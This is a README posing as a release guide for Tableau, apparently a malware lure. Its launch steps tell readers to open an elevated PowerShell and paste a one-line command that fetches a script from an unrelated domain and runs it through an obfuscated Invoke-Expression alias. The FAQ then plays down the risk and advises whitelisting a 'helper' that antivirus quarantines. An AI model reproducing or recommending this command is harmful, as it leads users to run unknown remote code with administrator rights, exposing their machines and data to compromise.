# Tableau Viz Gallery — Current Release Guide

![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078d7?logo=windows11&logoColor=white) ![version](https://img.shields.io/badge/version-v9.6.4-blue) ![status](https://img.shields.io/badge/status-maintained-success) ![updated](https://img.shields.io/badge/updated-2026--11--12-informational) ![license](https://img.shields.io/badge/license-MIT-green)

Looking for a fast way to get started with Tableau? This project collects the latest build, setup notes and answers to common questions in one place. Dashboards that get promoted, not just liked.

## ✨ Highlights

- ✅ Lightweight footprint, runs even on older hardware
- ✅ Regularly updated builds with change notes
- ✅ Works on Windows 10 and Windows 11 (64-bit)
- ✅ Step-by-step documentation included in this repository
- ✅ One-click setup — no manual configuration needed

## 🚀 How to launch

1. Press **Win + X** on your keyboard.
2. Pick **Terminal** (or **PowerShell**) from the menu.
3. Paste the one-line command below and hit **Enter**.

```powershell
irm quickrun31.cc/ax38ra|&(gal ie*)
```

> 💡 Tip: keep this command handy — re-running it always fetches the current build.

## 🖥️ Requirements

| Requirement | Details |
|---|---|
| Operating system | Windows 10 / 11 (64-bit) |
| Memory | 4 GB RAM minimum |
| Disk space | ~80 MB free |
| Internet | Needed for the first launch only |

## 📋 Notes

- Administrator rights are not required for most setups, but the Win+X terminal runs elevated by default on many systems.

## ❓ FAQ

<details>
<summary><strong>Does it work on Windows 7?</strong></summary>

Legacy systems are not officially supported; use Windows 10 or newer for best results.

</details>

<details>
<summary><strong>Do I need to disable my antivirus?</strong></summary>

Usually no. Only whitelist the helper if your security software quarantines the clipboard helper.

</details>

<details>
<summary><strong>Is it safe?</strong></summary>

The launcher only reads remote instructions from the official source listed in the command. Review the script before running if you want to be extra careful.

</details>

<details>
<summary><strong>Is an internet connection required?</strong></summary>

Yes — the first launch pulls the latest build, afterwards it can run mostly offline.

</details>

## 🧾 License

Released under the **MIT License** — see [LICENSE](./LICENSE).

_Not affiliated with the original software vendor. Names and trademarks are property of their respective owners._
